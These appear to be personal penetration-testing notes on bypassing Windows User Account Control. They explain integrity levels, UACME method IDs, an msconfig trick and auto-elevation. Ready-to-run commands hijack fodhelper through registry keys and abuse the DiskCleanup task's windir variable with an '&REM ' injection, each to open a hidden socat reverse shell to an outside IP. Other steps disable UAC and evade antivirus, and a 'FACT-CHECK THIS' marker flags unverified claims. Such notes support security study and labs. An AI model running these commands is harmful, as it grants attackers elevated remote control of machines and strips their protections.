#### User Account Control
User Account Control (UAC) is the GUI popup you get when trying to run something as administrator. It prevents a lot of exploits from working, but it can be bypassed.

#### Integrity Levels
Integrity Levels (IL) are used to differentiate users and processes for security purposes. There are 4 main levels:

|**Integrity Level**|**Use**|
|--- |---| 
|Low|Generally used for interaction with the Internet (i.e. Internet Explorer). Has very limited permissions.|
|Medium|Assigned to standard users and Administrators' filtered tokens. (e.g: running `cmd` as a user not named Administrator) |
|High|Used by Administrators' elevated tokens if UAC is enabled. If UAC is disabled, all administrators will always use a high IL token.|
|System|Reserved for system use.|

To check the current IL privilege level: 
```
whoami /groups
```
Example output;
```
[snip]
Mandatory Label\Low Mandatory Level
[snip]
Mandatory Label\Medium Mandatory Level
OR
[snip]
Mandatory Label\High Mandatory Level
```

For some operations, a `High` IL level is required (e.g. `net user /add`).


### Automated bypasses
To automate bypasses, use [UACME](https://github.com/hfiref0x/UACME/releases).

|Method Id|Bypass technique|
|---|---|
|33|fodhelper.exe|
|34|DiskCleanup scheduled task (Bypasses the "Always Notify") UAC level |
|70|fodhelper.exe using CurVer registry key (more stable, bypasses most AV) |
Syntax:
```
.\uacme.exe ID
```

### GUI bypasses
To go from a Medium
The easiest bypass is using `msconfig`: 
-  Type "msconfig" into the Windows search bar  (Or press "Windows-R" and enter "msconfig")
-  open "System Configuration"
-  Navigate to the "Tools" tab
-  Press "Command Prompt"
-  Click "Launch"

### Auto-elevating processes
Auto-Elevation (FACT-CHECK THIS) works without any GUI, antivirus enabld and will grant High IL permissions.
For the requirements to auto-elevate:
-  The executable must be signed by Micrososft/Windows
-  The executable must be in a trusted directory (e.g. `%SystemRoot%\System32\`, `%ProgramFiles%\`)
For `.exe` files, it needs the `autoElevate` to be set to `true` inside of the manifests.
To check this, use the SysInternals `sigcheck64`:
```
sigcheck64.exe -m PATH_TO_EXECUTABLE | findstr autoElevate
```

##### Example
To get an elevated reverse shell, use:
```shell-session
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.8.1.167:4444 EXEC:cmd.exe,pipes"
reg add "HKCU\Software\Classes\.edu\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".edu" /f
fodhelper.exe
```
Note: Make sure to run this all at once, as AV will catch it after a few seconds. This does not seem to work without GUI.

##### Cleaning up:
```batch
reg delete "HKCU\Software\Classes\.edu\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

### Bypassing Always Notify
When the highest UAC level is active, the other exploits, except for the automated exploit using ID 34 won't work.
For this, we can use environment variables.

Normally, disk Cleanup is a command run in the Task scheduler (`Task scheduler -> Task scheduler library -> Microsoft -> Windows -> DiskCleanup`). The `Run with highest privieleges` box should be enabled, giving it a high access token.
When switching to the `Actions` tab, the command becomes visible:
```
%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%`
```
For this, the `%windir` and `%systemdrive%` are environment variables, that can be modified, opening up for potential command injection.

##### Exploitation
```
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.8.1.167:4444 EXEC:cmd.exe,pipes &REM " /f      
schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```
##### Note: the "&REM " (including whitespace) is very important, because it comments out the normal command that would be run. It comments out the rest of the command being ran.
##### Cleaning up:
```
reg delete "HKCU\Environment" /v "windir" /f
```


##### Turning off UAC
```
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
```
